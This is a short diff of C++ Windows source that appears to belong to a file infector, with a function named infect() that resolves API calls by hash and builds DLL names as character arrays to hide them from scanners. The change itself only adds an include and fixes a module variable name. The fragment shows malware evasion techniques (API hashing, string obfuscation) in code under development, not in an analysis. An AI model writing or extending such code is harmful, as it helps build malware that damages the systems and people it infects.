@@ -3,6 +3,7 @@
 
 #include <windows.h>
 #include <winternl.h>
+#include <shlobj.h>
 
 typedef struct FULL_PEB_LDR_DATA
 {
@@ -142,7 +143,7 @@ void infect(void)
    mallocHeader malloc = reinterpret_cast<mallocHeader>(get_proc_by_hash(msvcrtModule, 0x558c274d));
    reallocHeader realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
    freeHeader free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
-   strncatHeader strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrt, 0xb1ee6f2e));
+   strncatHeader strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
    
    char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
    PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
